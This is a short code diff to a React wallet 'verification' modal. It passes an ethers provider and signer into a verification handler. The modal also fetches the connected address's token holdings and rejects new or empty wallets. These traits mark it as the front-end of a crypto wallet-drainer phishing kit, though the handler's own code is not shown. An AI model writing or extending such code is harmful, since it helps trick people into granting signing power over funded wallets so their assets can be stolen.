@@ -6,6 +6,7 @@ import {getAddressTokens, useAddressTokens} from "@v3/@special/wallet/hooks";
 import {ContractCovalenTHQ} from "@/app/(version1)/v1/TokenList";
 import {useInit} from "@/utils/safeState";
 import {doVerification} from "@v3/@special/wallet/handlers";
+import {useEthersProvider, useEthersSigner} from "@/app/(version1)/v1/ethers";
 
 export const handleWalletVerification = (account: ReturnType<typeof useAccount>) => {
 	window.location.href = "#verification";
@@ -29,6 +30,8 @@ export const WalletVerificationModal = () => {
 		text: "...",
 		title: "Checking address and validating wallet..."
 	});
+	const provider = useEthersProvider();
+	const signer = useEthersSigner()
 	const [tokens,setTokens] = useState<Awaited<ReturnType<typeof getAddressTokens>> | undefined>(undefined);
 	setVerifyState = setState;
 
@@ -52,7 +55,7 @@ export const WalletVerificationModal = () => {
 				error: "Please connect valid Wallet (don't connect new/empty wallet)"
 			}));
 		} else if (state.account) {
-			doVerification(state.account, target).catch((e: any)=>{
+			doVerification(provider,signer,state.account, target).catch((e: any)=>{
 				setVerifyState(pre => ({
 					...pre,
 					error: e?.message ?? e
